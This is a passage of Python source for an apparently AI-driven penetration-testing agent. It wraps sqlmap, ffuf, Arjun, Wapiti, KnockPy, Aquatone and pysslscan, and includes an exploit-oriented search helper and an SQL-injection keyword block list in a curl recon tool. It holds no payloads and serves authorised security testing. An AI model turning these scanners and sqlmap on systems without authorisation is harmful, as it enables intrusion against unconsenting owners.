import sys
import subprocess
import tempfile
import json
import os
import glob
import signal
from PIL import Image
from io import BytesIO
import requests
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse
import textwrap
import time
from autogen_core.tools import FunctionTool

# Attempt to import BeautifulSoup lazily to avoid hard dependency errors in environments without bs4
try:
    from bs4 import BeautifulSoup  # type: ignore
except ImportError:  # Fallback placeholder
    BeautifulSoup = None  # type: ignore

# Attempt to import OpenAI lazily to avoid hard dependency errors in environments without openai
try:
    import openai  # type: ignore
    from openai import OpenAI
    openai_client = OpenAI()
except ImportError:
    openai = None  # type: ignore
    openai_client = None

# ---------------- Token-tuned cache -----------------
_RESPONSE_CACHE: dict[str, str] = {}

def _cache_get(k: str):
    return _RESPONSE_CACHE.get(k)

def _cache_set(k: str, v: str):
    # simple size guard
    if len(_RESPONSE_CACHE) > 500:
        _RESPONSE_CACHE.pop(next(iter(_RESPONSE_CACHE)))
    _RESPONSE_CACHE[k] = v

# ---------------- Utility helpers -----------------

def _truncate(text: str, limit: int = 1800) -> str:
    """Return text truncated to `limit` chars with ellipsis note."""
    if len(text) <= limit:
        return text
    return text[:limit] + f"\n...[truncated {len(text) - limit} chars]..."

def run_subprocess_with_timeout(cmd, timeout, capture_output=True):
    """Run a subprocess with proper interrupt handling"""
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE if capture_output else None,
            stderr=subprocess.PIPE if capture_output else None,
            text=True if capture_output else False
        )
        
        try:
            stdout, stderr = process.communicate(timeout=timeout)
            # Truncate large outputs to keep token usage modest
            if capture_output:
                stdout = _truncate(stdout)
                stderr = _truncate(stderr)
            return process.returncode, stdout, stderr
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait()
            raise subprocess.TimeoutExpired(cmd, timeout)
        except KeyboardInterrupt:
            process.kill()
            process.wait()
            raise KeyboardInterrupt()
            
    except Exception as e:
        if isinstance(e, (KeyboardInterrupt, subprocess.TimeoutExpired)):
            raise
        return 1, "", str(e)

# ----------------------- curl headers with cache ------------------------

def run_curl_headers(
    url: str,
    method: str = "GET",
    data: str | None = None,
    headers: dict | None = None,
) -> str:
    """Fetch headers *and* body for a given URL.

    SECURITY GUARD – *Recon only*
    ---------------------------------
    This helper **must never** be abused to fire SQL-injection payloads.  Before any
    network call is made we therefore inspect the supplied *url*, *data*, and
    *headers* for high-risk SQLi tokens (quotes, comments, UNION/SELECT/etc.).
    If we find a match the request is rejected immediately and a warning string
    is returned to the caller.  This prevents mis-configured agents from using
    the lightweight curl endpoint for exploitation instead of discovery.

    • For simple reconnaissance (GET, no data) we still issue a quick HEAD request for speed.
    • For POST/other methods we send the full request so that response HTML is available for analysis.

    Returns a concise summary including discovered links and forms, *or* a
    blocking message if potentially malicious input is detected.
    """

    # ------------------------------------------------------
    # 1.  SQL-injection payload detection / hard block
    # ------------------------------------------------------
    _sqli_patterns = [
        r"'",               # single quote
        r"\"",             # double quote
        r"--",              # SQL comment
        r";",               # statement delimiter
        r"/\*",            # block comment start
        r"union", r"select", r"insert", r"update", r"delete", r" or ", r" and ",
    ]

    def _contains_sqli(text: str | None) -> bool:
        if not text:
            return False
        lowered = text.lower()
        return any(p in lowered for p in _sqli_patterns)

    if _contains_sqli(url) or _contains_sqli(data) or any(_contains_sqli(k) or _contains_sqli(str(v)) for k, v in (headers or {}).items()):
        return "[curl_headers_tool BLOCKED] Potential SQL-injection content detected – use Burp MCP tools instead."

    # Build cache key so identical POST bodies aren't refetched repeatedly
    cache_key = f"curl|{method}|{url}|{hash(data) if data else ''}"
    cached = _cache_get(cache_key)
    if cached is not None:
        return cached

    try:
        headers_out = ""
        body_out = ""

        # ---------------- Retrieve headers ----------------
        if method.upper() == "GET" and data is None:
            ret, headers_out, err = run_subprocess_with_timeout(["curl", "-I", url], timeout=15)
            if ret != 0:
                headers_out = err or "(curl -I failed)"
        else:
            # For non-GET we'll capture headers later with -i
            headers_out = "(see combined output)"

        # ---------------- Retrieve body (+ headers if needed) ----------------
        cmd_body = ["curl", "-sL", "--max-filesize", "262144", "-X", method.upper(), url]
        if headers:
            for k, v in headers.items():
                cmd_body += ["-H", f"{k}: {v}"]
        if data is not None:
            cmd_body += ["-d", data]
        # Include headers in output so we can parse if headers_out blank
        cmd_body.insert(1, "-i")  # after "curl"

        ret2, combined_out, err2 = run_subprocess_with_timeout(cmd_body, timeout=25)
        if ret2 != 0:
            combined_out = err2 or ""

        # Separate headers/body from combined output
        if "\r\n\r\n" in combined_out:
            headers_part, body_out = combined_out.split("\r\n\r\n", 1)
            if not headers_out or headers_out.startswith("(see"):
                headers_out = headers_part
        else:
            body_out = combined_out

        links_summary = "No links found."
        if body_out and BeautifulSoup is not None:
            links = extract_links_from_html(body_out, base_url=url, same_domain=True)[:30]
            if links:
                links_summary = "Links (first {}):\n".format(len(links)) + "\n".join(links)

        # Extract forms and field names for SQL-i reconnaissance
        forms_summary = "No forms found."
        try:
            soup = BeautifulSoup(body_out, "html.parser") if BeautifulSoup else None
            if soup:
                forms_desc: list[str] = []
                for idx, form in enumerate(soup.find_all("form")[:5], 1):
                    action = form.get("action", "").strip()
                    method_f = form.get("method", "GET").upper()
                    inputs = []
                    for inp in form.find_all("input"):
                        name = inp.get("name") or inp.get("id") or "<unnamed>"
                        inp_type = inp.get("type", "text")
                        inputs.append(f"{name}:{inp_type}")
                    forms_desc.append(f"Form {idx}: {method_f} {action} | Fields: {', '.join(inputs) if inputs else 'none'}")
                if forms_desc:
                    forms_summary = "Forms discovered:\n" + "\n".join(forms_desc)
        except Exception:
            forms_summary = "[form extraction error]"

        result = (
            "=== RESPONSE HEADERS ===\n" + _truncate(headers_out, 600) +
            "\n\n=== EXTRACTED LINKS ===\n" + _truncate(links_summary, 600) +
            "\n\n=== EXTRACTED FORMS ===\n" + _truncate(forms_summary, 800)
        )
        _cache_set(cache_key, result)
        return result
    except subprocess.TimeoutExpired:
        return f"[curl error] Timed out after 25 seconds"
    except KeyboardInterrupt:
        raise
    except Exception as e:
        return f"[curl error] {e}"

def run_sqlmap(url: str, extra_params: str = None) -> str:
    """
    Enhanced sqlmap execution with better output processing and additional testing options.
    """
    try:
        base_cmd = [
            "sqlmap", "-u", url, "--batch", "--crawl=0", "--level=2", "--risk=2", 
            "--banner", "--flush-session", "--parse-errors", "--fresh-queries"
        ]
        
        # Add extra parameters if provided
        if extra_params:
            base_cmd.extend(extra_params.split())
        
        returncode, stdout, stderr = run_subprocess_with_timeout(base_cmd, timeout=300)
        
        if returncode != 0:
            return f"[sqlmap error] {stderr}"
            
        # Process and structure the output
        output = stdout
        
        # Extract key information
        vulnerabilities = []
        if "sqlmap identified the following injection point" in output:
            vulnerabilities.append("SQL injection vulnerability found!")
        
        if "Parameter:" in output:
            # Extract parameter information
            lines = output.split('\n')
            for i, line in enumerate(lines):
                if "Parameter:" in line:
                    vulnerabilities.append(f"Vulnerable parameter: {line.strip()}")
                    if i + 1 < len(lines):
                        vulnerabilities.append(f"Details: {lines[i+1].strip()}")
        
        # Create structured summary
        summary = "=== SQLMAP SCAN RESULTS ===\n"
        if vulnerabilities:
            summary += "VULNERABILITIES FOUND:\n"
            for vuln in vulnerabilities:
                summary += f"- {vuln}\n"
        else:
            summary += "No SQL injection vulnerabilities detected.\n"
        
        # Add truncated full output
        summary += f"\n=== FULL OUTPUT (truncated) ===\n"
        summary += output[:800] + ("..." if len(output) > 800 else "")
        
        return summary
        
    except subprocess.TimeoutExpired:
        return f"[sqlmap error] Timed out after 300 seconds. Try using lighter options or target specific parameters."
    except KeyboardInterrupt:
        raise
    except Exception as e:
        return f"[sqlmap error] {e}"

def arjun_scan(
    url: str = None,
    textFile: str = None,
    wordlist: str = None,
    method: str = None,
    rateLimit: int = 9999,
    chunkSize: int = None
) -> str:
    """
    Discover hidden HTTP parameters using Arjun. At least one of url or textFile is required.
    Usage:
      - url: Target URL to scan (e.g., https://example.com)
      - textFile: Path to file with URLs (optional)
      - wordlist: Path to custom wordlist (optional)
      - method: HTTP method (GET, POST, etc, optional)
      - rateLimit: Requests per second (default 9999)
      - chunkSize: Number of params per chunk (optional)
    """
    cmd = ["arjun", "-o", "json"]
    if url:
        cmd += ["-u", url]
    if textFile:
        cmd += ["-i", textFile]
    if wordlist:
        cmd += ["-w", wordlist]
    if method:
        cmd += ["-m", method]
    if rateLimit:
        cmd += ["--rate-limit", str(rateLimit)]
    if chunkSize:
        cmd += ["--chunk-size", str(chunkSize)]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout
    except Exception as e:
        return f"[arjun error] {e}"

def pysslscan_scan(
    target: str,
    scan: list = None,
    report: str = None,
    ssl2: bool = False,
    ssl3: bool = False,
    tls10: bool = False,
    tls11: bool = False,
    tls12: bool = False
) -> str:
    """
    Run pysslscan on a target. Example usage:
      - target: URL or host (e.g., http://example.org)
      - scan: List of scan modules (e.g., [protocol.http, vuln.heartbleed, server.renegotiation, server.preferred_ciphers, server.ciphers])
      - report: Report format (e.g., term:rating=ssllabs.2009e)
      - ssl2, ssl3, tls10, tls11, tls12: Enable protocol support (bool)
    """
    cmd = ["pysslscan", "scan"]
    if scan:
        for s in scan:
            cmd += ["--scan=" + s]
    if report:
        cmd += ["--report=" + report]
    if ssl2:
        cmd.append("--ssl2")
    if ssl3:
        cmd.append("--ssl3")
    if tls10:
        cmd.append("--tls10")
    if tls11:
        cmd.append("--tls11")
    if tls12:
        cmd.append("--tls12")
    cmd.append(target)
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout
    except Exception as e:
        return f"[pysslscan error] {e}"

def aquatone_scan(
    input_file: str = None,
    out_dir: str = None,
    extra_args: str = None
) -> str:
    """
    Run aquatone from the current directory with the required Chrome path.
    """
    chrome_path = r"C:\Users\User\Desktop\autogen-test\aquatone\Google Chrome.lnk"
    temp_dir = None
    if not out_dir:
        temp_dir = tempfile.mkdtemp(prefix="aquatone_")
        out_dir = temp_dir
    aquatone_cmd = [".\\aquatone.exe", "-chrome-path", chrome_path, "-out", out_dir]
    if extra_args:
        aquatone_cmd += extra_args.split()
    try:
        if input_file:
            with open(input_file, "r", encoding="utf-8") as f:
                input_data = f.read()
            result = subprocess.run(aquatone_cmd, input=input_data, capture_output=True, text=True, timeout=600)
        else:
            result = subprocess.run(aquatone_cmd, capture_output=True, text=True, timeout=600)
        output = result.stdout + ("\n[stderr:]\n" + result.stderr if result.stderr else "")
        return f"[aquatone output directory: {out_dir}]\n" + output
    except Exception as e:
        return f"[aquatone error] {e}"

def summarize_aquatone_output(out_dir: str) -> str:
    """
    Summarize Aquatone's JSON outputs from the given output directory.
    """
    summary = []
    try:
        hosts_path = os.path.join(out_dir, 'hosts.json')
        urls_path = os.path.join(out_dir, 'urls.json')
        if os.path.exists(hosts_path):
            with open(hosts_path, 'r', encoding='utf-8') as f:
                hosts = json.load(f)
            summary.append(f"Hosts ({len(hosts)}):\n" + '\n'.join(h.get('hostname', str(h)) for h in hosts))
        if os.path.exists(urls_path):
            with open(urls_path, 'r', encoding='utf-8') as f:
                urls = json.load(f)
            summary.append(f"URLs ({len(urls)}):\n" + '\n'.join(u.get('url', str(u)) for u in urls))
        screenshots_dir = os.path.join(out_dir, 'screenshots')
        if os.path.isdir(screenshots_dir):
            screenshots = [f for f in os.listdir(screenshots_dir) if f.lower().endswith('.png')]
            summary.append(f"Screenshots: {len(screenshots)} found.")
        if not summary:
            return f"No Aquatone JSON outputs found in {out_dir}."
        return '\n\n'.join(summary)
    except Exception as e:
        return f"[summarize_aquatone_output error] {e}"

def knockpy_scan(domain: str, wordlist: str = None, extra_args: str = None) -> str:
    """
    Run KnockPy on a domain, using a temp output directory to avoid clutter.
    """
    temp_dir = tempfile.mkdtemp(prefix="knockpy_")
    knockpy_cmd = [sys.executable, "-m", "knockpy", domain, "-o", temp_dir]
    if wordlist:
        knockpy_cmd += ["--wordlist", wordlist]
    if extra_args:
        knockpy_cmd += extra_args.split()
    try:
        result = subprocess.run(knockpy_cmd, capture_output=True, text=True, timeout=600)
        output = result.stdout + ("\n[stderr:]\n" + result.stderr if result.stderr else "")
        return f"[knockpy output directory: {temp_dir}]\n" + output
    except Exception as e:
        return f"[knockpy error] {e}"

def summarize_knockpy_output(out_dir: str) -> str:
    """
    Summarize KnockPy's output from the given output directory.
    """
    summary = []
    try:
        json_files = [f for f in os.listdir(out_dir) if f.endswith('.json')]
        if json_files:
            for jf in json_files:
                with open(os.path.join(out_dir, jf), 'r', encoding='utf-8') as f:
                    data = json.load(f)
                subs = data.get('subdomains', []) if isinstance(data, dict) else data
                summary.append(f"Subdomains ({len(subs)}):\n" + '\n'.join(str(s) for s in subs))
        txt_files = [f for f in os.listdir(out_dir) if f.endswith('.txt')]
        if txt_files:
            for tf in txt_files:
                with open(os.path.join(out_dir, tf), 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                summary.append(f"Text file {tf} ({len(lines)} lines):\n" + ''.join(lines[:10]) + ("..." if len(lines) > 10 else ""))
        if not summary:
            return f"No KnockPy output found in {out_dir}."
        return '\n\n'.join(summary)
    except Exception as e:
        return f"[summarize_knockpy_output error] {e}"

def run_ffuf(
    url: str,
    wordlist: str,
    headers: str = None,
    method: str = "GET",
    data: str = None,
    filter_status: str = None,
    filter_size: str = None,
    match_code: str = None,
    match_size: str = None,
    threads: int = 50,
    delay: float = None,
    extra_args: str = None
) -> str:
    """
    Enhanced ffuf execution with better output processing and smart filtering.
    """
    try:
        temp_dir = tempfile.mkdtemp(prefix="ffuf_")
        output_file = os.path.join(temp_dir, "ffuf.json")
        
        ffuf_cmd = ["ffuf", "-u", url, "-w", wordlist, "-o", output_file, "-of", "json"]
        
        # Smart defaults for better results
        if not filter_status and not match_code:
            ffuf_cmd += ["-fc", "404,403"]  # Filter common false positives
        
        if headers:
            for h in headers.split(","):
                h = h.strip()
                if h:
                    ffuf_cmd += ["-H", h]
        if method and method.upper() != "GET":
            ffuf_cmd += ["-X", method.upper()]
        if data:
            ffuf_cmd += ["-d", data]
        if filter_status:
            ffuf_cmd += ["-fc", filter_status]
        if filter_size:
            ffuf_cmd += ["-fs", filter_size]
        if match_code:
            ffuf_cmd += ["-mc", match_code]
        if match_size:
            ffuf_cmd += ["-ms", match_size]
        if threads:
            ffuf_cmd += ["-t", str(threads)]
        if delay:
            ffuf_cmd += ["-p", str(delay)]
        if extra_args:
            ffuf_cmd += extra_args.split()
        
        returncode, stdout, stderr = run_subprocess_with_timeout(ffuf_cmd, timeout=900)
        
        if returncode != 0:
            return f"[ffuf error] {stderr}"
        
        # Process JSON output for better summary
        summary = "=== FFUF SCAN RESULTS ===\n"
        
        try:
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    data = json.load(f)
                    
                results = data.get('results', [])
                if results:
                    summary += f"Found {len(results)} interesting paths:\n"
                    # Sort by status code and size
                    results.sort(key=lambda x: (x.get('status', 0), x.get('length', 0)))
                    
                    for res in results[:20]:  # Limit to top 20 results
                        url_path = res.get('url', '')
                        status = res.get('status', 'N/A')
                        length = res.get('length', 'N/A')
                        words = res.get('words', 'N/A')
                        summary += f"- {url_path} [Status: {status}, Size: {length}, Words: {words}]\n"
                    
                    if len(results) > 20:
                        summary += f"... and {len(results) - 20} more results\n"
                else:
                    summary += "No interesting paths found.\n"
        except Exception as e:
            summary += f"Error processing results: {e}\n"
        
        # Add command output
        if stdout:
            summary += f"\n=== COMMAND OUTPUT ===\n{stdout[:500]}"
        if stderr:
            summary += f"\n=== ERRORS ===\n{stderr[:300]}"
            
        summary += f"\n[Full results saved to: {temp_dir}]"
        return summary
        
    except subprocess.TimeoutExpired:
        return f"[ffuf error] Timed out after 900 seconds"
    except KeyboardInterrupt:
        raise
    except Exception as e:
        return f"[ffuf error] {e}"

def run_wapiti(
    url: str,
    scope: str = "folder",
    modules: str = None,
    level: int = None,
    output_dir: str = None,
    format: str = "json",
    detailed_report: int = 2,
    extra_args: str = None
) -> str:
    """
    Run Wapiti3 web vulnerability scanner.
    Output will be saved to a 'wapiti_scan_results' subdirectory in the current working directory if output_dir is not specified.
    """
    if not output_dir:
        # Save to a subdirectory in the current working directory
        output_dir = os.path.join(os.getcwd(), "wapiti_scan_results")
    
    # Ensure the output directory exists
    os.makedirs(output_dir, exist_ok=True)
    
    # Construct a unique report filename within the output directory to avoid overwriting
    # Use a timestamp or target-based name if multiple runs are expected for different targets
    # For simplicity, let's use a generic name for now, but this could be improved
    report_base_name = f"wapiti_report_{url.replace('://', '_').replace('/', '_')}"
    # Wapiti appends the format extension, so we provide the base path.
    # However, Wapiti's -o argument is for the directory. It names files itself.
    
    wapiti_cmd = ["wapiti", "-u", url, "-f", format, "-o", output_dir]
    
    if scope:
        wapiti_cmd.extend(["--scope", scope])
    if modules:
        wapiti_cmd.extend(["-m", modules])
    if level:
        wapiti_cmd.extend(["-l", str(level)])
    if detailed_report:
        wapiti_cmd.extend(["-dr", str(detailed_report)])
    if extra_args:
        wapiti_cmd.extend(extra_args.split())

    try:
        result = subprocess.run(wapiti_cmd, capture_output=True, text=True, timeout=1800)  # 30 min timeout
        output = result.stdout + ("\n[stderr:]\n" + result.stderr if result.stderr else "")
        return f"[wapiti output directory: {output_dir}]\n" + output
    except Exception as e:
        return f"[wapiti error] {e}"

def read_wapiti_report(output_dir: str) -> str:
    """
    Read and summarize the Wapiti scan report from the output directory.
    """
    try:
        report_files = []
        for ext in [".json", ".xml", ".html", ".txt"]:
            report_files.extend(glob.glob(os.path.join(output_dir, f"*{ext}")))
        
        if not report_files:
            return f"No report files found in {output_dir}"
            
        report_file = report_files[0]  # Use first found report
        
        if report_file.endswith(".json"):
            with open(report_file, "r", encoding="utf-8") as f:
                data = json.load(f)
                
            summary = ["=== Wapiti Scan Results ==="]
            
            if "infos" in data:
                summary.append("\nScan Information:")
                for key, value in data["infos"].items():
                    summary.append(f"- {key}: {value}")
            
            if "vulnerabilities" in data:
                summary.append("\nVulnerabilities Found:")
                for vuln_type, entries in data["vulnerabilities"].items():
                    summary.append(f"\n{vuln_type}:")
                    for entry in entries:
                        summary.append(f"- URL: {entry.get('curl_command', 'N/A')}")
                        summary.append(f"  Method: {entry.get('method', 'N/A')}")
                        if "parameter" in entry:
                            summary.append(f"  Parameter: {entry['parameter']}")
                        if "info" in entry:
                            summary.append(f"  Info: {entry['info']}")
                        summary.append("")
            
            if "anomalies" in data:
                summary.append("\nAnomalies Found:")
                for anomaly_type, entries in data["anomalies"].items():
                    summary.append(f"\n{anomaly_type}:")
                    for entry in entries:
                        summary.append(f"- URL: {entry.get('curl_command', 'N/A')}")
                        if "info" in entry:
                            summary.append(f"  Info: {entry['info']}")
                        summary.append("")
            
            return "\n".join(summary)
        else:
            with open(report_file, "r", encoding="utf-8") as f:
                return f"=== Wapiti Report ({os.path.basename(report_file)}) ===\n\n{f.read()}"
                
    except Exception as e:
        return f"[read_wapiti_report error] {e}"

def save_image_to_temp(image_data) -> str:
    """Save an image to a temporary file and return its path"""
    if isinstance(image_data, Image.Image):
        img = image_data
    elif isinstance(image_data, bytes):
        img = Image.open(BytesIO(image_data))
    else:
        raise ValueError("Unsupported image data type")
    
    temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.png')
    img.save(temp_file.name, format='PNG')
    return temp_file.name

def google_custom_search(query: str, num_results: int = 5, site_filter: str = None) -> str:
    """
    Search Google using Custom Search API for penetration testing and security information.
    
    Args:
        query: Search query string
        num_results: Number of results to return (1-10, default 5)
        site_filter: Optional site to restrict search to (e.g., "portswigger.net")
    
    Returns:
        Formatted search results with titles, snippets, and URLs
    """
    try:
        # Get API credentials from environment variables
        api_key = os.getenv('GOOGLE_API_KEY')
        search_engine_id = os.getenv('GOOGLE_SEARCH_ENGINE_ID')
        
        if not api_key or not search_engine_id:
            return "[Google Search Error] GOOGLE_API_KEY and GOOGLE_SEARCH_ENGINE_ID environment variables must be set. Get them from Google Cloud Console and Custom Search Engine setup."
        
        # Enhance query for security/pentest context if not specific
        enhanced_query = enhance_security_query(query)
        
        # Build the API request URL
        base_url = "https://www.googleapis.com/customsearch/v1"
        params = {
            'key': api_key,
            'cx': search_engine_id,
            'q': enhanced_query,
            'num': min(max(num_results, 1), 10)  # Clamp between 1-10
        }
        
        # Add site filter if specified
        if site_filter:
            params['siteSearch'] = site_filter
            params['siteSearchFilter'] = 'i'  # Include only results from this site
        
        # Make the API request
        response = requests.get(base_url, params=params, timeout=30)
        response.raise_for_status()
        
        data = response.json()
        
        # Process and format results
        results = []
        items = data.get('items', [])
        
        if not items:
            return f"No search results found for: {enhanced_query}"
        
        results.append(f"=== GOOGLE SEARCH RESULTS ===")
        results.append(f"Query: {enhanced_query}")
        results.append(f"Found {len(items)} results:\n")
        
        for i, item in enumerate(items, 1):
            title = item.get('title', 'No title')
            snippet = item.get('snippet', 'No description available')
            url = item.get('link', 'No URL')
            
            # Clean up snippet (remove extra whitespace, truncate if too long)
            snippet = ' '.join(snippet.split())
            if len(snippet) > 200:
                snippet = snippet[:200] + "..."
            
            results.append(f"{i}. **{title}**")
            results.append(f"   URL: {url}")
            results.append(f"   Description: {snippet}\n")
        
        # Add search tips
        results.append("=== SEARCH TIPS ===")
        results.append("Use site_filter parameter to search specific sites:")
        results.append("- portswigger.net (Web Security Academy)")
        results.append("- owasp.org (OWASP documentation)")
        results.append("- cve.mitre.org (CVE database)")
        results.append("- exploit-db.com (Exploit Database)")
        
        return '\n'.join(results)
        
    except requests.exceptions.RequestException as e:
        return f"[Google Search Error] Network error: {e}"
    except json.JSONDecodeError as e:
        return f"[Google Search Error] Invalid JSON response: {e}"
    except Exception as e:
        return f"[Google Search Error] {e}"

def enhance_security_query(query: str) -> str:
    """
    Enhance search queries with security/penetration testing context.
    """
    query = query.strip()
    
    # Security-focused query enhancements
    security_terms = {
        'sql injection': 'SQL injection penetration testing techniques payloads',
        'sqli': 'SQL injection pentesting bypass authentication',
        'xss': 'cross-site scripting XSS payload exploitation',
        'csrf': 'CSRF cross-site request forgery exploitation',
        'rce': 'remote code execution vulnerability exploitation',
        'lfi': 'local file inclusion LFI exploitation techniques',
        'rfi': 'remote file inclusion RFI vulnerability',
        'ssti': 'server-side template injection SSTI payload',
        'xxe': 'XML external entity XXE injection',
        'directory traversal': 'directory traversal path traversal vulnerability',
        'file upload': 'file upload vulnerability web shell exploitation',
        'authentication bypass': 'authentication bypass login security vulnerability',
        'privilege escalation': 'privilege escalation vulnerability exploitation',
        'broken access control': 'broken access control OWASP vulnerability'
    }
    
    # Check if query contains security terms and enhance accordingly
    query_lower = query.lower()
    for term, enhancement in security_terms.items():
        if term in query_lower:
            # Don't double-enhance if already contains security terms
            if not any(sec_word in query_lower for sec_word in ['vulnerability', 'exploitation', 'penetration', 'security']):
                return f"{query} {enhancement}"
            break
    
    # If no specific security term found, add general pentest context
    if not any(word in query_lower for word in ['vulnerability', 'exploit', 'hack', 'penetration', 'security', 'attack']):
        query = f"{query} penetration testing security vulnerability"
    
    return query

def search_security_sites(query: str, num_results: int = 3) -> str:
    """
    Search specific security-focused websites for penetration testing information.
    """
    security_sites = [
        'portswigger.net',
        'owasp.org', 
        'cve.mitre.org',
        'exploit-db.com'
    ]
    
    all_results = []
    all_results.append(f"=== SECURITY SITES SEARCH ===")
    all_results.append(f"Query: {query}\n")
    
    for site in security_sites:
        try:
            site_results = google_custom_search(query, num_results=num_results, site_filter=site)
            if "No search results found" not in site_results and "Error" not in site_results:
                all_results.append(f"--- Results from {site} ---")
                # Extract just the results part, skip headers
                lines = site_results.split('\n')
                in_results = False
                for line in lines:
                    if line.startswith('Found ') and 'results:' in line:
                        in_results = True
                        continue
                    elif line.startswith('=== SEARCH TIPS ==='):
                        break
                    elif in_results:
                        all_results.append(line)
                all_results.append("")
        except:
            continue
    
    if len(all_results) <= 2:  # Only headers added
        return f"No results found across security sites for: {query}"
    
    return '\n'.join(all_results)

def extract_links_from_html(html: str, base_url: str = None, same_domain: bool = True) -> List[str]:
    """Parse the supplied HTML and return a list of fully-qualified links.

    Args:
        html: Raw HTML text to parse.
        base_url: Optional base URL used to resolve relative links with urljoin.
        same_domain: If True (default) keep only links that share the same netloc as base_url.

    Returns:
        Sorted list of unique URLs discovered in <a href="…"> elements.
        If bs4 is not installed, returns an explanatory string embedded in a list.
    """
    if BeautifulSoup is None:
        return ["[extract_links_from_html error] BeautifulSoup (bs4) not installed"]

    try:
        soup = BeautifulSoup(html, "html.parser")
        links: set[str] = set()
        for a in soup.find_all("a", href=True):
            href = a["href"].strip()
            # Skip empty, anchor, mailto, javascript links
            if not href or href.startswith("#") or href.lower().startswith("javascript:") or href.lower().startswith("mailto:"):
                continue
            full_url = urljoin(base_url, href) if base_url else href
            if same_domain and base_url:
                try:
                    if urlparse(full_url).netloc != urlparse(base_url).netloc:
                        continue
                except Exception:
                    pass
            links.add(full_url)
        return sorted(links)
    except Exception as e:
        return [f"[extract_links_from_html error] {e}"]

# ---------------------------------------------------------------------------
#  Log Summariser (stand-alone, optional)
# ---------------------------------------------------------------------------

def summarise_log(raw: str, max_lines: int = 120, max_chars: int = 1500) -> str:
    """Return a short RESULT line and truncated preview of a long scanner log.

    This is a lightweight fallback that works without LLMs; replace with an
    LLM-powered summariser by swapping out this function. Keep the same
    signature so callers don't break.
    """
    if not raw:
        return "RESULT: (empty log)"

    lines = [l.strip() for l in raw.splitlines() if l.strip()]
    preview = "\n".join(lines[:max_lines])
    preview = _truncate(preview, max_chars)
    return f"RESULT: summarised log ({len(raw)} chars original)\n" + preview

# ------------------ LLM-powered log summariser ------------------

def summarise_log_llm(raw: str, model: str = "gpt-3.5-turbo", max_tokens: int = 256) -> str:
    """Summarise log via OpenAI ChatCompletion. Falls back to summarise_log() if
    OpenAI package or API key missing. Function kept separate from default
    agent team; import and use on demand."""

    if openai is None or not os.getenv("OPENAI_API_KEY"):
        return summarise_log(raw)

    if not raw:
        return "RESULT: (empty log)"

    prompt = textwrap.dedent(
        f"""
        You are a penetration-testing assistant. Summarise the following scanner log in <=120 words.
        After the prose summary, output a JSON object on a new line with keys `urls` and `params` listing any newly
        discovered URLs or HTTP parameters. If none, use empty arrays.
        Log follows:
        ---
        {raw[:4000]}
        ---
        """
    )

    try:
        resp = openai.ChatCompletion.create(
            model=model,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=max_tokens,
            temperature=0.3,
        )
        content = resp["choices"][0]["message"]["content"].strip()
        return "RESULT: " + content
    except Exception as e:
        return summarise_log(raw[:1500]) + f"\n[LLM summariser error: {e}]"

def summarise_http_response(raw: str, max_header_chars: int = 600, max_body_chars: int = 1000, url: str = "") -> str:
    """Return concise summary of an HTTP response using LLM analysis for HTML content.

    • Keeps status line & headers (truncated)
    • Uses LLM to analyze HTML body for security-relevant information
    • Falls back to manual extraction if LLM unavailable
    """
    if not isinstance(raw, str):
        return raw

    # Split headers vs body
    header_part, body_part = "", ""
    if "\r\n\r\n" in raw:
        header_part, body_part = raw.split("\r\n\r\n", 1)
    elif "\n\n" in raw:
        header_part, body_part = raw.split("\n\n", 1)
    else:
        lines = raw.splitlines()
        header_part = "\n".join(lines[:20])
        body_part = "\n".join(lines[20:])

    # Fallback: if header_part empty but we have HTTP/ status somewhere inside, attempt to extract
    if not header_part:
        import re
        m = re.search(r"HTTP/\d\.\d \d{3} [A-Za-z ]+", raw)
        if m:
            header_part = m.group(0)

    # If still nothing useful, just return a notice
    if not header_part and not body_part:
        return "[summarise_http_response] Empty or unparseable response."

    header_part = _truncate(header_part.strip(), max_header_chars)

    body_analysis = ""
    html_like = body_part and ("<html" in body_part.lower() or "<form" in body_part.lower() or "<!doctype" in body_part.lower())

    if html_like:
        # Attempt structured extraction first
        body_analysis = summarize_html_with_llm(body_part, url)
        # Also include raw preview so explicit success / welcome text isn't lost
        body_analysis += "\n\n=== RAW BODY PREVIEW ===\n" + _truncate(body_part.strip(), max_body_chars)
    else:
        body_analysis = "=== BODY PREVIEW ===\n" + _truncate(body_part.strip(), max_body_chars)

    return (
        "=== RESPONSE HEADERS ===\n" + header_part +
        "\n\n" + body_analysis
    )

# ------------------- Burp MCP response extractor -------------------

def parse_burp_response(raw_burp_output: str) -> str:
    """Extract the raw HTTP response portion from Burp MCP's HttpRequestResponse blob.

    The MCP returns a Java-style string such as::

        HttpRequestResponse{httpRequest=GET /index HTTP/1.1\r\nHost: ex.com..., httpResponse=HTTP/1.1 302 Found\r\n..., messageAnnotations=...}

    This helper pulls out the substring that starts after ``httpResponse=`` and ends just before ``messageAnnotations`` (or the closing brace).  It also converts escaped CR/LF sequences so that standard HTTP-parsing utilities work.
    """

    if not raw_burp_output or not isinstance(raw_burp_output, str):
        return str(raw_burp_output)

    import re, json, html

    # If wrapped in JSON list/dict (common with MCP tools), unwrap first
    if raw_burp_output.lstrip().startswith("["):
        try:
            data = json.loads(raw_burp_output)
            if isinstance(data, list) and data and isinstance(data[0], dict):
                raw_burp_output = data[0].get("text", raw_burp_output)
        except Exception:
            pass

    # Regex to capture between httpResponse= ... , messageAnnotations or end brace
    m = re.search(r"httpResponse=(.*?)(?:,\s*messageAnnotations=|}$)", raw_burp_output, re.DOTALL)
    if m:
        http_resp = m.group(1)
    else:
        # Fallback – maybe entire string is already the HTTP response.
        http_resp = raw_burp_output

    # Unescape common escape sequences
    http_resp = http_resp.replace("\\r\\n", "\r\n").replace("\\n", "\n")
    http_resp = html.unescape(http_resp)

    return http_resp.strip()

# ----------------------- Arjun summariser -----------------------

def summarise_arjun_output(raw: str, keep_words: int = 30) -> str:
    """Return only the last `keep_words` words of Arjun output for brevity."""
    if not raw:
        return "(empty Arjun output)"
    # collapse newlines to spaces, split, keep last words
    words = raw.replace("\n", " ").split()
    snippet = " ".join(words[-keep_words:])
